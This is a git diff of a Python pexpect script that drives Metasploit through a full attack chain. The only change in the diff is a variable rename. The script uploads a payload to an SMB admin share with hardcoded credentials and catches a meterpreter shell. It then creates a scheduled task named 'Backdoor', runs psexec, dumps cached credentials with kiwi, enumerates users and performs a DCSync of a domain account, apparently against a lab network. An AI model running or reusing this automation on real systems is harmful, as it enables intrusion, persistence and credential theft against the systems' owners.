@@ -2,7 +2,7 @@
 import pexpect
 import os
 
-#Testing logging and script.after for reference. Attempt on laptop with faster external drives for hyper-v
+#Testing logging and msf_script.after for reference. Attempt on laptop with faster external drives for hyper-v
 
 print ("INITIALISING")
 print ("WELCOME")
@@ -13,153 +13,153 @@ process.expect('Final')
 print ("MSFVENOM SCRIPT COMPLETE. NAME=shell.exe")
 
 # Start Metasploit
-script = pexpect.spawn('msfconsole', encoding='utf-8')
+msf_script = pexpect.spawn('msfconsole', encoding='utf-8')
 fout = open('Metascript_logs.txt','wb')
-script.logfile = fout
+msf_script.logfile = fout
 
 # Wait for Metasploit prompt
-script.expect('msf6')
+msf_script.expect('msf6')
 print ("SKIPPING SMB LOGIN - TIME CONSTRAINTS")
 print ("RUNNING WMIEXEC")
 # Running resource1.rc
-script.sendline('resource resource1.rc')
-print (script.read)
-script.expect('auxiliary', timeout=120)
+msf_script.sendline('resource resource1.rc')
+print (msf_script.read)
+msf_script.expect('auxiliary', timeout=120)
 print ("WMIEXEC COMPLETED - SUCCESS")
-print (script.after)
+print (msf_script.after)
 
 print ("BEGINNING SMBCLIENT")
 #SMB client put shell.exe
-script.sendline('smbclient //172.22.117.20/C$ -U megacorpone/tstark')
-script.expect('password')
+msf_script.sendline('smbclient //172.22.117.20/C$ -U megacorpone/tstark')
+msf_script.expect('password')
 print ("ENTERING PASSWORD")
-script.sendline('Password!')
-script.expect('smb')
+msf_script.sendline('Password!')
+msf_script.expect('smb')
 
 print ("PUTTING SHELL.EXE")
-print (script.after)
+print (msf_script.after)
 
-script.sendline('put shell.exe')
-script.expect('smb')
+msf_script.sendline('put shell.exe')
+msf_script.expect('smb')
 
 print ("COMPLETE - EXITING")
-print (script.after)
+print (msf_script.after)
 
-script.sendline('exit')
-script.expect('auxiliary')
+msf_script.sendline('exit')
+msf_script.expect('auxiliary')
 
 print ("SHELL.EXE SUCCESSFULLY PLACED - SMBCLIENT SUCCESS")
-print (script.after)
+print (msf_script.after)
 
 
 print ("BEGINNING MULTI HANDLER")
 # Running resource2.rc
-script.sendline('resource resource2.rc')
-script.expect_exact('meterpreter', timeout=999)
+msf_script.sendline('resource resource2.rc')
+msf_script.expect_exact('meterpreter', timeout=999)
 
 print ("RESOURCE 2 COMPLETED - ATTACK SUCCESS")
-print (script.after)
+print (msf_script.after)
 
 print ("METERPRETER SHELL TO BACKGROUND")
-script.sendline('background')
-script.expect('auxiliary')
+msf_script.sendline('background')
+msf_script.expect('auxiliary')
 
 print ("BACKGROUND SUCCESS")
-print (script.after)
+print (msf_script.after)
 
 
 print ("BEGINNING PERSISTENCE SERVICES")
 # Running resource3.rc
-script.sendline('resource resource3.rc')
-script.expect('meterpreter', timeout=120)
+msf_script.sendline('resource resource3.rc')
+msf_script.expect('meterpreter', timeout=120)
 
 print ("SUCCESS - REQUESTING SHELL")
-print (script.after)
+print (msf_script.after)
 
-script.sendline('shell')
-script.expect('C:\\ ', timeout=120)
+msf_script.sendline('shell')
+msf_script.expect('C:\\ ', timeout=120)
 
 print ("SHELL ESTABLISHED - CREATING SCHEDULED TASK")
-print (script.after)
+print (msf_script.after)
 
-script.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
-script.expect('C:\\ ')
+msf_script.sendline('schtasks /create /f /tn Backdoor /SC ONCE /ST 00:00 /TR "C:\shell.exe"')
+msf_script.expect('C:\\ ')
 
 print ("SCHEDULED TASK CREATED SUCCESSFULLY - EXITING")
-print (script.after)
+print (msf_script.after)
 
-script.sendline('exit')
-script.expect('meterpreter')
+msf_script.sendline('exit')
+msf_script.expect('meterpreter')
 
-print (script.after)
+print (msf_script.after)
 
-script.sendline('exit')
-script.expect('exploit')
+msf_script.sendline('exit')
+msf_script.expect('exploit')
 
 print ("RESOURCE 3 COMPLETED - ATTACK SUCCESS")
-print (script.after)
+print (msf_script.after)
 
 
 print (" BEGINNING PSEXEC")
 # Running resource4.rc
-script.sendline('resource resource4.rc')
-script.expect('meterpreter')
+msf_script.sendline('resource resource4.rc')
+msf_script.expect('meterpreter')
 
 print ("PSEXEC COMPLETED - ATTACK SUCCESS")
-print (script.after)
+print (msf_script.after)
 
 print ("STARTING KIWI")
-script.sendline('load kiwi')
-script.expect('meterpreter')
+msf_script.sendline('load kiwi')
+msf_script.expect('meterpreter')
 
-script.sendline('kiwi_cmd lsadump::cache')
-script.expect('meterpreter')
+msf_script.sendline('kiwi_cmd lsadump::cache')
+msf_script.expect('meterpreter')
 
 print ("CACHE DUMP SUCCESS - EXITING KIWI")
-print (script.after)
+print (msf_script.after)
 
-script.sendline('exit')
-script.expect('exploit')
+msf_script.sendline('exit')
+msf_script.expect('exploit')
 
-print (script.after)
+print (msf_script.after)
 
 
 print ("STARTING LATERAL MOVEMENT")
 # Running resource5.rc
-script.sendline('resource resource5.rc')
-script.expect('meterpreter')
-print (script.after)
+msf_script.sendline('resource resource5.rc')
+msf_script.expect('meterpreter')
+print (msf_script.after)
 
 print ("REQUESTING SYSINFO")
-script.sendline('sysinfo')
-script.expect('meterpreter')
-print (script.after)
+msf_script.sendline('sysinfo')
+msf_script.expect('meterpreter')
+print (msf_script.after)
 
 
 print ("SUCCESS - ENTERING SHELL")
-script.sendline('shell')
-script.expect('system32')
-print (script.after)
+msf_script.sendline('shell')
+msf_script.expect('system32')
+print (msf_script.after)
 
 
 print ("SHELL ESTABLISHED - REQUESTING USERS")
-script.sendline('net users')
-script.expect('system32')
+msf_script.sendline('net users')
+msf_script.expect('system32')
 print ("USERS ESTABLISHED - EXITING - OPENING KIWI")
-print (script.after)
+print (msf_script.after)
 
 
-script.sendline('exit')
-script.expect('meterpreter')
-script.sendline('load kiwi')
-script.expect('meterpreter')
-print (script.after)
+msf_script.sendline('exit')
+msf_script.expect('meterpreter')
+msf_script.sendline('load kiwi')
+msf_script.expect('meterpreter')
+print (msf_script.after)
 
 print ("KIWI LOADED - TESTING DCSYNC")
-script.sendline('dcsync_ntlm cdanvers')
-script.expect('meterpreter')
+msf_script.sendline('dcsync_ntlm cdanvers')
+msf_script.expect('meterpreter')
 
 print ("ATTACK SUCCESS - PROVEN VULNERABILITY - SHUTTING DOWN")
 
 
-script.close()
+msf_script.close()
